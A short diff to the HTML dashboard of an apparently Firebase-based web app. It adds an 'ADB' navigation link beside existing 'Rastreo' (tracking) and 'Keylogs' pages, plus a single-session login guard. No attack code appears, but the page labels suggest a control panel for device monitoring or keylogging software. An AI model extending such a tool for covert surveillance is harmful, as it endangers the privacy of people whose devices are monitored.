@@ -19,6 +19,7 @@
             <a href="rastreo.html">Rastreo</a>
             <a href="keylogs.html">Keylogs</a>
             <a href="perfil.html">Perfil</a>
+            <a href="adb.html">ADB</a>
         </nav>
         <button class="btn-ghost btn-inline" id="btn-out">Cerrar sesion</button>
     </header>
@@ -56,7 +57,8 @@
     </div>
 
     <script type="module">
-        import { auth, signOut, db, ref, onValue } from './firebase-config.js';
+        import { auth, signOut, db, ref, onValue, set, onDisconnect } from './firebase-config.js';
+        import { ensureSingleSession } from './session-guard.js';
 
         const userInfo = document.getElementById('user-info');
         const btnOut = document.getElementById('btn-out');
@@ -69,6 +71,8 @@
                 location.href = 'index.html';
                 return;
             }
+
+            ensureSingleSession({ auth, db, ref, set, onValue, onDisconnect, signOut, user: u });
 
             userInfo.textContent = u.email;
 
